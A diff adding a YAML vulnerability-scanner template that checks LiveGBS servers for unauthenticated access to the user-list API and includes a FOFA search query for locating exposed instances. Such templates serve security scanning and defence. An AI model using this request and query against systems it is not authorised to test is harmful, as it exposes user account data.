@@ -1,0 +1,28 @@
+id: poc-yaml-livegbs-list-unauthorized-access
+info:
+  name: LiveGBS List Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  metadata:
+    fofa-query: icon_hash="-206100324"
+
+http:
+  - method: GET
+    path:
+      - "/api/v1/user/list?q=&start=&limit=10&enable=&sort=CreatedAt&order=desc"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Username\":"
+          - "\"ID\""
+          - "\"UserList\":"
+      - type: word
+        part: header
+        words:
+          - "application/json"
